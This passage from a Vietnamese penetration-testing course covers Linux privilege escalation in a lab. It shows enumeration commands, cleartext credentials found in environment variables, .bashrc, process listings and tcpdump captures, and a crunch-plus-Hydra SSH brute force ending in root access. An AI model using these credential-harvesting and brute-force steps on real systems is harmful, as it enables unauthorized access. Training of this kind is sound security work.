ii  apache2-bin                           2.4.38-3+deb10u7                             amd64        Apache HTTP Server (modules and other binary files)
ii  apache2-data                          2.4.38-3+deb10u7                             all          Apache HTTP Server (common files)
ii  apache2-doc                           2.4.38-3+deb10u7                             all          Apache HTTP Server (on-site documentation)
ii  apache2-utils                         2.4.38-3+deb10u7                             amd64        Apache HTTP Server (utility programs for web servers)
...
```

                   *Listing 14 - Liệt kê tất cả các gói đã cài đặt trên một hệ điều hành Debian Linux*

Điều này xác nhận điều mà chúng ta kỳ vọng trước đó từ việc liệt kê các cổng lắng nghe: máy Debian 10 thực tế đang chạy một web server. Trong trường hợp này, nó đang chạy Apache2.

Như chúng ta đã đề cập trước đó, các tệp có hạn chế truy cập không đầy đủ có thể tạo ra một lỗ hổng mà có thể cấp cho kẻ tấn công các đặc quyền nâng cao. Điều này thường xảy ra khi kẻ tấn công có thể sửa đổi các script hoặc các tệp nhị phân được thực thi dưới ngữ cảnh của một tài khoản đặc quyền.

Các tệp nhạy cảm có thể đọc được bởi một người dùng không đặc quyền cũng có thể chứa thông tin quan trọng như thông tin xác thực hard-coded cho một cơ sở dữ liệu hoặc một tài khoản dịch vụ đang chạy với đặc quyền cao hơn.

Vì không khả thi để kiểm tra thủ công quyền của từng tệp và thư mục, chúng ta cần tự động hóa tác vụ này nhiều nhất có thể. Để bắt đầu, chúng ta có thể dùng `find` để xác định các tệp có quyền không an toàn.

Trong ví dụ dưới đây, chúng ta đang tìm mọi thư mục có thể ghi được bởi người dùng hiện tại trên hệ thống mục tiêu. Chúng ta sẽ tìm trên toàn bộ thư mục gốc (/) và dùng đối số `-writable` để chỉ định thuộc tính mà chúng ta quan tâm. Chúng ta cũng có thể dùng `-type d` để định vị thư mục, và lọc lỗi với `2>/dev/null`:

```
joe@debian-privesc:~$ find / -writable -type d 2>/dev/null
..
/home/joe
/home/joe/Videos
/home/joe/Templates
/home/joe/.local
/home/joe/.local/share
/home/joe/.local/share/sounds
/home/joe/.local/share/evolution
/home/joe/.local/share/evolution/tasks
/home/joe/.local/share/evolution/tasks/system
/home/joe/.local/share/evolution/tasks/trash
/home/joe/.local/share/evolution/addressbook
/home/joe/.local/share/evolution/addressbook/system
/home/joe/.local/share/evolution/addressbook/system/photos
/home/joe/.local/share/evolution/addressbook/trash
/home/joe/.local/share/evolution/mail
/home/joe/.local/share/evolution/mail/trash
/home/joe/.local/share/evolution/memos
/home/joe/.local/share/evolution/memos/system
/home/joe/.local/share/evolution/memos/trash
/home/joe/.local/share/evolution/calendar
/home/joe/.local/share/evolution/calendar/system
/home/joe/.local/share/evolution/calendar/trash
/home/joe/.local/share/icc
/home/joe/.local/share/gnome-shell
/home/joe/.local/share/gnome-settings-daemon
/home/joe/.local/share/keyrings
/home/joe/.local/share/tracker
/home/joe/.local/share/tracker/data
/home/joe/.local/share/folks
/home/joe/.local/share/gvfs-metadata
/home/joe/.local/share/applications
/home/joe/.local/share/nano
/home/joe/Downloads
/home/joe/.scripts
/home/joe/Pictures
/home/joe/.cache

...
```

                                   *Listing 15 - Liệt kê tất cả các thư mục world writable*

Như được thể hiện ở trên, một số thư mục dường như có thể ghi được bởi mọi người (world-writable), bao gồm thư mục /home/joe/.scripts, là vị trí của script cron mà chúng ta tìm thấy trước đó. Điều này chắc chắn cần được điều tra thêm.

Hãy tiếp tục với việc liệt kê của chúng ta. Trên hầu hết hệ thống, các ổ đĩa được tự động mount khi khởi động. Vì vậy, rất dễ quên các ổ đĩa chưa được mount có thể chứa thông tin có giá trị. Chúng ta nên luôn tìm các ổ chưa mount và nếu tồn tại, kiểm tra quyền mount.

Trên các hệ thống dựa trên Linux, chúng ta có thể dùng `mount` để liệt kê tất cả filesystem đã được mount. Ngoài ra, tệp `/etc/fstab` liệt kê tất cả các ổ sẽ được mount khi khởi động.

```
joe@debian-privesc:~$ cat /etc/fstab 
...
UUID=60b4af9b-bc53-4213-909b-a2c5e090e261 /               ext4    errors=remount-ro 0       1
# swap was on /dev/sda5 during installation
UUID=86dc11f3-4b41-4e06-b923-86e78eaddab7 none            swap    sw              0       0
/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0

joe@debian-privesc:~$ mount
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
udev on /dev type devtmpfs (rw,nosuid,relatime,size=1001064k,nr_inodes=250266,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
tmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=204196k,mode=755)
/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro)
securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
cgroup2 on /sys/fs/cgroup/unified type cgroup2 (rw,nosuid,nodev,noexec,relatime,nsdelegate)
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
bpf on /sys/fs/bpf type bpf (rw,nosuid,nodev,noexec,relatime,mode=700)
...
systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=25,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=10550)
mqueue on /dev/mqueue type mqueue (rw,relatime)
debugfs on /sys/kernel/debug type debugfs (rw,relatime)
hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,pagesize=2M)
tmpfs on /run/user/117 type tmpfs (rw,nosuid,nodev,relatime,size=204192k,mode=700,uid=117,gid=124)
tmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,size=204192k,mode=700,uid=1000,gid=1000)
binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,relatime)
```

                          *Listing 16 - Liệt kê nội dung của /etc/fstab và tất cả các ổ đã mount*

Đầu ra cho thấy một phân vùng swap và ổ đĩa ext4 chính của hệ thống Linux này.

Hãy ghi nhớ rằng quản trị viên hệ thống có thể đã dùng các cấu hình hoặc script tùy biến để mount các ổ không được liệt kê trong tệp `/etc/fstab`. Vì vậy, thực hành tốt là không chỉ quét `/etc/fstab`, mà còn thu thập thông tin về các ổ đã mount bằng `mount`.

Hơn nữa, chúng ta có thể dùng lsblk để xem tất cả các đĩa sẵn có.

```
joe@debian-privesc:~$ lsblk
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda      8:0    0   32G  0 disk
|-sda1   8:1    0   31G  0 part /
|-sda2   8:2    0    1K  0 part
`-sda5   8:5    0  975M  0 part [SWAP]
sr0     11:0    1 1024M  0 rom
```

                                              *Listing 17 - Liệt kê tất cả các ổ sẵn có bằng lsblk*

Chúng ta sẽ nhận thấy ổ sda bao gồm ba phân vùng khác nhau với số thứ tự. Trong một số tình huống, hiển thị thông tin cho tất cả các đĩa cục bộ trên hệ thống có thể tiết lộ các phân vùng chưa được mount. Tùy thuộc vào cấu hình (hoặc cấu hình sai) của hệ thống, khi đó chúng ta có thể mount các phân vùng đó và tìm kiếm các tài liệu đáng quan tâm, thông tin xác thực, hoặc các thông tin khác có thể cho phép chúng ta leo thang đặc quyền hoặc có được foothold tốt hơn trong mạng.

Một kỹ thuật leo thang đặc quyền phổ biến khác liên quan đến khai thác các device driver và kernel module. Chúng ta sẽ khám phá các chiến thuật khai thác thực tế sau trong Module này, nhưng trước tiên hãy xem một số kỹ thuật liệt kê quan trọng.

Vì kỹ thuật này dựa vào việc ghép các lỗ hổng với các exploit tương ứng, chúng ta sẽ cần thu thập danh sách các driver và kernel module đang được nạp trên mục tiêu. Chúng ta có thể liệt kê các kernel module đã nạp bằng `lsmod` mà không cần đối số bổ sung nào.

```
joe@debian-privesc:~$ lsmod
Module                  Size  Used by
binfmt_misc            20480  1
rfkill                 28672  1
sb_edac                24576  0
crct10dif_pclmul       16384  0
crc32_pclmul           16384  0
ghash_clmulni_intel    16384  0
vmw_balloon            20480  0
...
drm                   495616  5 vmwgfx,drm_kms_helper,ttm
libata                270336  2 ata_piix,ata_generic
vmw_pvscsi             28672  2
scsi_mod              249856  5 vmw_pvscsi,sd_mod,libata,sg,sr_mod
i2c_piix4              24576  0
button                 20480  0
```

                                                    *Listing 18 - Liệt kê các driver đã nạp*

Khi chúng ta đã thu thập danh sách các module đã nạp và xác định những module mà chúng ta muốn biết thêm thông tin, chẳng hạn libata trong ví dụ ở trên, chúng ta có thể dùng modinfo để tìm hiểu thêm về module cụ thể. Chúng ta nên lưu ý rằng công cụ này yêu cầu đường dẫn đầy đủ để chạy.

```
joe@debian-privesc:~$ /sbin/modinfo libata
filename:       /lib/modules/4.19.0-21-amd64/kernel/drivers/ata/libata.ko
version:        3.00
license:        GPL
description:    Library module for ATA devices
author:         Jeff Garzik
srcversion:     00E4F01BB3AA2AAF98137BF
depends:        scsi_mod
retpoline:      Y
intree:         Y
name:           libata
vermagic:       4.19.0-21-amd64 SMP mod_unload modversions
sig_id:         PKCS#7
signer:         Debian Secure Boot CA
sig_key:        4B:6E:F5:AB:CA:66:98:25:17:8E:05:2C:84:66:7C:CB:C0:53:1F:8C
...
```

                                           *Listing 19 - Hiển thị thông tin bổ sung về một module*

Khi chúng ta đã có được danh sách các driver và phiên bản của chúng, chúng ta sẽ ở vị thế tốt hơn để tìm các exploit liên quan.

Sau này trong Module, chúng ta sẽ khám phá nhiều phương pháp leo thang đặc quyền. Tuy nhiên, có một vài nội dung liệt kê cụ thể mà chúng ta nên đề cập trong phần này có thể tiết lộ những “đường tắt” thú vị để leo thang đặc quyền.

Ngoài các quyền tệp rwx đã mô tả trước đó, hai quyền đặc biệt bổ sung liên quan đến các tệp thực thi là `setuid` và `setgid`. Chúng được ký hiệu bằng chữ “s”.

Nếu hai quyền này được thiết lập, một chữ “s” viết hoa hoặc viết thường sẽ xuất hiện trong phần quyền. Điều này cho phép người dùng hiện tại thực thi tệp với quyền của chủ sở hữu (setuid) hoặc nhóm của chủ sở hữu (setgid).

Khi chạy một file thực thi, thông thường nó kế thừa các quyền của người dùng chạy nó. Tuy nhiên, nếu quyền SUID được thiết lập, file nhị phân sẽ chạy với quyền của chủ sở hữu tệp. Điều này có nghĩa là nếu một file nhị phân có SUID bit được thiết lập và tệp thuộc sở hữu của root, bất kỳ người dùng cục bộ nào cũng sẽ có thể thực thi file nhị phân đó với đặc quyền nâng cao.

Khi một người dùng hoặc một script tự động của hệ thống khởi chạy một ứng dụng SUID, nó kế thừa UID/GID của script khởi chạy: điều này được gọi là effective UID/GID (eUID, eGID), tức là người dùng thực tế mà hệ điều hành xác minh để cấp quyền cho một hành động nhất định.

Bất kỳ người dùng nào có thể bẻ hướng một chương trình setuid root để gọi một lệnh do họ lựa chọn đều có thể giả mạo người dùng root một cách hiệu quả và giành toàn bộ quyền trên hệ thống. Các penetration tester thường xuyên tìm các loại tệp này khi họ có quyền truy cập vào một hệ thống như một cách để leo thang đặc quyền.

Chúng ta có thể dùng find để tìm các binary được đánh dấu SUID. Trong trường hợp này, chúng ta bắt đầu tìm từ thư mục gốc (/), tìm các tệp (-type f) có SUID bit được thiết lập, (-perm -u=s) và loại bỏ tất cả thông báo lỗi (2>/dev/null):

```
joe@debian-privesc:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/ntfs-3g
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/bwrap
/usr/bin/su
/usr/bin/umount
/usr/bin/mount
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/xorg/Xorg.wrap
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pppd
```

                                                            *Listing 20 - Tìm kiếm các tệp SUID*

Trong trường hợp này, lệnh đã tìm thấy một số binary SUID. Việc khai thác các binary SUID sẽ khác nhau dựa trên nhiều yếu tố. Ví dụ, nếu /bin/cp (lệnh copy) là SUID, chúng ta có thể sao chép và ghi đè các tệp nhạy cảm như /etc/passwd.

Một danh sách toàn diện các kỹ thuật leo thang đặc quyền trên Linux có thể được tìm thấy trong một compendium của g0tmi1k cũng như trong các tài nguyên khác mới hơn.

Sau khi đã bao quát các khái niệm chính đằng sau việc liệt kê thủ công các hệ thống Linux nhằm tìm các kỹ thuật leo thang đặc quyền, chúng ta sẽ học cách tự động hóa quy trình hàng loạt trong phần sắp tới.

---

## 1.3. Liệt kê tự động

---

Như chúng ta đã học trong phần trước, các hệ thống Linux chứa rất nhiều thông tin có thể được sử dụng cho các cuộc tấn công tiếp theo. Tuy nhiên, việc thu thập thủ công các thông tin chi tiết này có thể khá tốn thời gian. May mắn là chúng ta có thể sử dụng nhiều script khác nhau để tự động hóa quá trình này.

Để có một baseline ban đầu về hệ thống mục tiêu, chúng ta có thể dùng `unix-privesc-check` trên các hệ dẫn xuất UNIX như Linux. Script Bash này được cài sẵn trên máy Kali cục bộ của chúng ta tại `/usr/bin/unix-privesc-check`, và nó thực hiện một số kiểm tra để tìm các cấu hình sai của hệ thống có thể bị lạm dụng cho leo thang đặc quyền cục bộ. Chúng ta có thể xem chi tiết công cụ bằng cách chạy script mà không truyền bất kỳ đối số nào.

```
kali@kali:~$ unix-privesc-check
unix-privesc-check v1.4 ( http://pentestmonkey.net/tools/unix-privesc-check )

Usage: unix-privesc-check { standard | detailed }

"standard" mode: Speed-optimised check of lots of security settings.

"detailed" mode: Same as standard mode, but also checks perms of open file
                 handles and called files (e.g. parsed from shell scripts,
                 linked .so files).  This mode is slow and prone to false 
                 positives but might help you find more subtle flaws in 3rd
                 party programs.

This script checks file permissions and other settings that could allow
local users to escalate privileges.
...
```

                                                          *Listing 21 - Chạy unix_privesc_check*

Như được thể hiện trong listing ở trên, script hỗ trợ chế độ “standard” và “detailed”. Dựa trên thông tin được cung cấp, chế độ standard có vẻ thực hiện một quy trình được tối ưu về tốc độ và nên cung cấp số lượng false positive ít hơn. Vì vậy, trong ví dụ sau, chúng ta sẽ chuyển script sang hệ thống mục tiêu và dùng chế độ standard để chuyển hướng toàn bộ đầu ra vào một tệp tên là output.txt.

```
joe@debian-privesc:~$ ./unix-privesc-check standard > output.txt

```

                                                           *Listing 22 - Chạy unix_privesc_check*

Script thực hiện rất nhiều kiểm tra về quyền đối với các tệp phổ biến. Ví dụ, trích đoạn sau cho thấy các tệp cấu hình có thể ghi được bởi người dùng không phải root:

```
Checking for writable config files
############################################
    Checking if anyone except root can change /etc/passwd
WARNING: /etc/passwd is a critical config file. World write is set for /etc/passwd
    Checking if anyone except root can change /etc/group
    Checking if anyone except root can change /etc/fstab
    Checking if anyone except root can change /etc/profile
    Checking if anyone except root can change /etc/sudoers
    Checking if anyone except root can change /etc/shadow
```

                                  *Listing 23 - Các tệp cấu hình có thể ghi của unix_privesc_check*

Đầu ra này cho thấy bất kỳ ai trên hệ thống cũng có thể chỉnh sửa /etc/passwd. Đây là một phát hiện khá quan trọng vì nó cho phép kẻ tấn công dễ dàng leo thang đặc quyền hoặc tạo tài khoản người dùng trên mục tiêu. Chúng ta sẽ trình bày điều này ở phần sau của Module.

Có nhiều công cụ khác cũng đáng được nhắc đến, được thiết kế riêng cho việc thu thập thông tin phục vụ leo thang đặc quyền trên Linux, bao gồm LinEnum và LinPeas vốn đã được phát triển và cải tiến tích cực trong những năm gần đây.

Mặc dù các công cụ này thực hiện nhiều kiểm tra tự động, chúng ta nên ghi nhớ rằng mỗi hệ thống là khác nhau, và các thay đổi hệ thống “one-off” độc nhất thường sẽ bị các công cụ dạng này bỏ sót. Vì lý do này, việc kiểm tra các cấu hình độc nhất mà chỉ có thể bắt được bằng kiểm tra thủ công là quan trọng, như đã minh họa trong phần trước.

Trong Learning Unit tiếp theo, chúng ta sẽ học cách hành động dựa trên thông tin mà chúng ta thu được thông qua liệt kê để leo thang đặc quyền.

---

# 2. Thông tin mật bị lộ

---

Learning Unit này bao gồm các Learning Objective sau:

- Hiểu về các tệp lịch sử của người dùng
- Kiểm tra dấu vết người dùng để thu thập thông tin xác thực
- Kiểm tra dấu vết hệ thống để thu thập thông tin xác thực

Trong Learning Unit này, chúng ta sẽ xem xét cách các tệp lịch sử của người dùng và dịch vụ tạo thành giai đoạn khởi đầu của quá trình leo thang đặc quyền, thường dẫn đến kết quả mong muốn.

---

## 2.1. Kiểm tra dấu vết người dùng

---

Là các penetration tester, chúng ta thường bị giới hạn về thời gian trong quá trình thực hiện các engagement. Vì lý do này, chúng ta nên tập trung nỗ lực trước tiên vào những “low-hanging fruit”.

Một trong những mục tiêu như vậy là các tệp lịch sử của người dùng. Những tệp này thường lưu trữ hoạt động của người dùng ở dạng clear-text, có thể bao gồm các thông tin nhạy cảm như mật khẩu hoặc các dữ liệu xác thực khác.

Trên các hệ thống Linux, các ứng dụng thường lưu các tệp cấu hình và thư mục con dành riêng cho người dùng trong thư mục home của người dùng đó. Những tệp này thường được gọi là dotfile vì chúng được đặt trước bằng một dấu chấm. Ký tự dấu chấm đứng đầu chỉ thị cho hệ thống không hiển thị các tệp này khi kiểm tra bằng các lệnh liệt kê cơ bản.

Một ví dụ về dotfile là .bashrc. Script bash .bashrc được thực thi khi một cửa sổ terminal mới được mở từ một phiên đăng nhập hiện có hoặc khi một instance shell mới được khởi chạy từ một phiên đăng nhập hiện có. Bên trong script này, các biến môi trường bổ sung có thể được chỉ định để tự động được thiết lập mỗi khi một shell mới của người dùng được tạo.

Đôi khi, các quản trị viên hệ thống lưu trữ thông tin xác thực bên trong các biến môi trường như một cách để tương tác với các script tùy chỉnh yêu cầu xác thực.

Khi xem xét máy Debian mục tiêu của chúng ta, chúng ta sẽ nhận thấy một mục biến môi trường bất thường:

```
joe@debian-privesc:~$ env
...
XDG_SESSION_CLASS=user
TERM=xterm-256color
SCRIPT_CREDENTIALS=lab
USER=joe
LC_TERMINAL_VERSION=3.4.16
SHLVL=1
XDG_SESSION_ID=35
LC_CTYPE=UTF-8
XDG_RUNTIME_DIR=/run/user/1000
SSH_CLIENT=192.168.118.2 59808 22
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
MAIL=/var/mail/joe
SSH_TTY=/dev/pts/1
OLDPWD=/home/joe/.cache
_=/usr/bin/env
```

                                                      *Listing 24 - Kiểm tra các biến môi trường*

Đáng chú ý, biến SCRIPT_CREDENTIALS chứa một giá trị trông giống như mật khẩu. Để xác nhận rằng chúng ta đang xử lý một biến vĩnh viễn, chúng ta cần kiểm tra tệp cấu hình .bashrc.

```
joe@debian-privesc:~$ cat .bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
export SCRIPT_CREDENTIALS="lab"
HISTCONTROL=ignoreboth
...
```

                                                         *Listing 25 - Kiểm tra .bashrc*

Từ listing trên, chúng ta có thể xác nhận rằng biến chứa mật khẩu được export mỗi khi shell của người dùng được khởi chạy.

*Việc lưu trữ mật khẩu dạng clear-text trong một biến môi trường không được xem là một best practice về bảo mật. Để xác thực an toàn với một script tương tác, khuyến nghị nên áp dụng xác thực bằng khóa công khai và bảo vệ khóa riêng bằng passphrase.*

Trước tiên, hãy thử leo thang đặc quyền bằng cách trực tiếp nhập mật khẩu mới được phát hiện.

```
joe@debian-privesc:~$ su - root
Password:

root@debian-privesc:~# whoami
root
```

                             *Listing 26 - Trở thành người dùng “root” với thông tin xác thực bị lộ*

Vì chúng ta đã thành công trong việc giành được đặc quyền root, bây giờ hãy thử một con đường leo thang đặc quyền khác, thay vào đó dựa trên việc phát hiện thông tin xác thực trong biến môi trường.

Thay vì nhắm trực tiếp vào tài khoản root, chúng ta có thể thử giành quyền truy cập vào người dùng eve mà chúng ta đã phát hiện trong một phần trước đó.

Với kiến thức về thông tin xác thực của script, chúng ta có thể thử xây dựng một dictionary tùy chỉnh dựa trên mật khẩu đã biết để thử brute force tài khoản của eve.

Chúng ta có thể làm điều này bằng cách sử dụng công cụ dòng lệnh crunch để tạo một wordlist tùy chỉnh. Chúng ta sẽ đặt độ dài tối thiểu và tối đa là 6 ký tự, chỉ định pattern bằng tham số -t, sau đó hard-code ba ký tự đầu là Lab theo sau bởi ba chữ số.

```
kali@kali:~$ crunch 6 6 -t Lab%%% > wordlist
```

                               *Listing 27 - Tạo wordlist cho một cuộc tấn công brute force*

Sau đó, chúng ta có thể kiểm tra nội dung của wordlist đã tạo:

```
kali@kali:~$ cat wordlist
Lab000
Lab001
Lab002
Lab003
Lab004
Lab005
Lab006
Lab007
Lab008
Lab009
...
```

                                                     *Listing 28 - Kiểm tra nội dung wordlist*

Vì trên máy mục tiêu có sẵn một SSH server, chúng ta có thể thử thực hiện một cuộc tấn công brute force từ xa thông qua Hydra. Chúng ta sẽ cung cấp tên người dùng mục tiêu bằng tham số -l, wordlist của chúng ta bằng -P, địa chỉ IP mục tiêu, và cuối cùng là ssh làm giao thức mục tiêu. Chúng ta cũng sẽ thêm -V để tăng mức độ verbose.

```
kali@kali:~$ hydra -l eve -P wordlist  192.168.50.214 -t 4 ssh -V
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-23 14:30:44
[DATA] max 4 tasks per 1 server, overall 4 tasks, 1000 login tries (l:1/p:1000), ~250 tries per task
[DATA] attacking ssh://192.168.50.214:22/
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab000" - 1 of 1000 [child 0] (0/0)
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab001" - 2 of 1000 [child 1] (0/0)
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab002" - 3 of 1000 [child 2] (0/0)
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab003" - 4 of 1000 [child 3] (0/0)
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab004" - 5 of 1000 [child 2] (0/0)
...
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab120" - 121 of 1000 [child 0] (0/0)
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab121" - 122 of 1000 [child 3] (0/0)
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab122" - 123 of 1000 [child 2] (0/0)
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab123" - 124 of 1000 [child 1] (0/0)
[22][ssh] host: 192.168.50.214   login: eve   password: Lab123
1 of 1 target successfully completed, 1 valid password found
```

                                        *Listing 29 - Brute force thành công mật khẩu của eve*

Cuộc tấn công brute force bằng hydra của chúng ta đã thành công và giờ chúng ta có thể đăng nhập trực tiếp vào máy mục tiêu với thông tin xác thực của eve thông qua SSH:

```
kali@kali:~$ ssh eve@192.168.50.214
eve@192.168.50.214's password:
Linux debian-privesc 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64
...
eve@debian-privesc:~$
```

                                          *Listing 30 - Đăng nhập thành công với tư cách eve*

Sau khi đăng nhập với tư cách eve, chúng ta có thể xác minh liệu mình có đang chạy với tư cách người dùng đặc quyền hay không bằng cách liệt kê các quyền sudo bằng lệnh sudo -l.

```
eve@debian-privesc:~$ sudo -l
[sudo] password for eve:
Matching Defaults entries for eve on debian-privesc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User eve may run the following commands on debian-privesc:
    (ALL : ALL) ALL
```

                                                             *Listing 31 - Kiểm tra các quyền sudo*

Vì eve dường như là một tài khoản quản trị, chúng ta phát hiện rằng nó có thể chạy bất kỳ lệnh nào với tư cách người dùng nâng cao. Điều này có nghĩa là chúng ta có thể leo thang trực tiếp lên root bằng cách chạy -i với sudo và cung cấp thông tin xác thực của eve.

```
eve@debian-privesc:~$ sudo -i
[sudo] password for eve:

root@debian-privesc:/home/eve# whoami
root
```

                                                          *Listing 32 - Leo thang lên root*

Tuyệt vời! Chúng ta đã quản lý leo thang đặc quyền và giành được quyền truy cập quản trị thông qua một con đường khác. Trong phần tiếp theo, chúng ta sẽ học cách leo thang đặc quyền bằng cách thu thập thông tin xác thực của các dịch vụ hệ thống.

---

## 2.2 Kiểm tra dấu vết dịch vụ

---

System daemon là các dịch vụ Linux được khởi tạo khi hệ thống boot để thực hiện các thao tác cụ thể mà không cần bất kỳ sự tương tác nào từ người dùng. Các máy chủ Linux thường được cấu hình để chạy nhiều daemon, chẳng hạn như SSH, web server và cơ sở dữ liệu, chỉ để nêu một vài ví dụ.

Các quản trị viên hệ thống thường dựa vào các daemon tùy chỉnh để thực thi các tác vụ ad-hoc và đôi khi họ bỏ qua các best practice về bảo mật.

Là một phần trong nỗ lực liệt kê của chúng ta, chúng ta nên kiểm tra hành vi của các tiến trình đang chạy để săn tìm bất kỳ dấu hiệu bất thường nào có thể dẫn đến việc leo thang đặc quyền.

Không giống như trên các hệ thống Windows, trên Linux chúng ta có thể liệt kê thông tin về các tiến trình có đặc quyền cao hơn, chẳng hạn như các tiến trình đang chạy trong ngữ cảnh người dùng root.

Chúng ta có thể liệt kê tất cả các tiến trình đang chạy bằng lệnh ps và vì nó chỉ lấy một snapshot duy nhất của các tiến trình đang hoạt động, chúng ta có thể làm mới nó bằng lệnh watch. Trong ví dụ sau, chúng ta sẽ chạy lệnh ps mỗi giây thông qua tiện ích watch và grep kết quả để tìm bất kỳ lần xuất hiện nào của từ “pass”.

```
joe@debian-privesc:~$ watch -n 1 "ps -aux | grep pass"
...

joe      16867  0.0  0.1   6352  2996 pts/0    S+   05:41   0:00 watch -n 1 ps -aux | grep pass
root     16880  0.0  0.0   2384   756 ?        S    05:41   0:00 sh -c sshpass -p 'Lab123' ssh  -t eve@127.0.0.1 'sleep 5;exit'
root     16881  0.0  0.0   2356  1640 ?        S    05:41   0:00 sshpass -p zzzzzz ssh -t eve@127.0.0.1 sleep 5;exit
...
```

                      *Listing 33 - Thu thập thông tin xác thực từ các tiến trình đang hoạt động*

Trong Listing 33, chúng ta nhận thấy quản trị viên đã cấu hình một system daemon kết nối tới hệ thống cục bộ bằng thông tin xác thực của eve ở dạng clear-text. Quan trọng nhất là việc tiến trình này chạy với tư cách root không ngăn cản chúng ta kiểm tra hoạt động của nó.

Một góc nhìn tổng thể hơn mà chúng ta nên cân nhắc khi liệt kê phục vụ leo thang đặc quyền là xác minh xem chúng ta có quyền bắt gói tin mạng hay không.

`tcpdump` là tiêu chuẩn dòng lệnh de facto cho việc bắt gói tin, và nó yêu cầu quyền quản trị vì nó hoạt động trên raw socket. Tuy nhiên, không hiếm trường hợp các tài khoản IT được cấp quyền độc quyền để sử dụng công cụ này cho mục đích khắc phục sự cố.

Để minh họa khái niệm này, chúng ta có thể chạy tcpdump với tư cách người dùng joe, người đã được cấp các quyền sudo cụ thể để chạy công cụ này.

*tcpdump không thể được chạy nếu không có quyền sudo. Điều này là do nó cần thiết lập raw socket để bắt lưu lượng, đây là một thao tác đặc quyền.*

Hãy thử bắt lưu lượng vào và ra khỏi giao diện loopback, sau đó dump nội dung ở dạng ASCII bằng tham số -A. Cuối cùng, chúng ta muốn lọc bất kỳ lưu lượng nào chứa từ khóa “pass”.

```
joe@debian-privesc:~$ sudo tcpdump -i lo -A | grep "pass"
[sudo] password for joe:
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
...{...zuser:root,pass:lab -
...5...5user:root,pass:lab -
```

                                               *Listing 34 - Sử dụng tcpdump để sniff mật khẩu*

Sau vài giây, chúng ta đã thu được thông tin xác thực của người dùng root ở dạng clear-text. Tuyệt vời!

Hai ví dụ này cung cấp một điểm khởi đầu cho rất nhiều hướng tiếp cận khả dụng khi săn tìm thông tin xác thực bị lộ. Sau khi đã bao quát các “low-hanging fruit”, tiếp theo chúng ta sẽ khám phá cách leo thang đặc quyền thông qua các quyền tệp bị cấu hình sai.

---

# 3. Quyền tệp không an toàn

---

Learning Unit này bao gồm các Learning Objective sau:

- Lạm dụng các cron job không an toàn để leo thang đặc quyền
- Lạm dụng các quyền tệp không an toàn để leo thang đặc quyền

Trong Learning Unit này, chúng ta sẽ xem xét cách các quyền tệp bị cấu hình sai có thể dẫn đến những con đường khác nhau cho việc leo thang đặc quyền.

---

## 3.1. Lạm dụng Cron Job

---

Hãy tập trung vào một nhóm kỹ thuật leo thang đặc quyền khác và tìm hiểu cách tận dụng các quyền tệp không an toàn. Trong phần này, chúng ta sẽ giả định rằng chúng ta đã giành được quyền truy cập vào máy mục tiêu Linux với tư cách là một người dùng không đặc quyền.

Để có thể tận dụng các quyền tệp không an toàn, chúng ta phải xác định được một tệp thực thi không chỉ cho phép chúng ta quyền ghi, mà còn được thực thi ở mức đặc quyền cao. Trên một hệ thống Linux, trình lập lịch tác vụ theo thời gian cron là một mục tiêu lý tưởng, vì các tác vụ theo lịch ở cấp hệ thống được thực thi với đặc quyền của người dùng root và các quản trị viên hệ thống thường tạo các script cho cron job với quyền không an toàn.

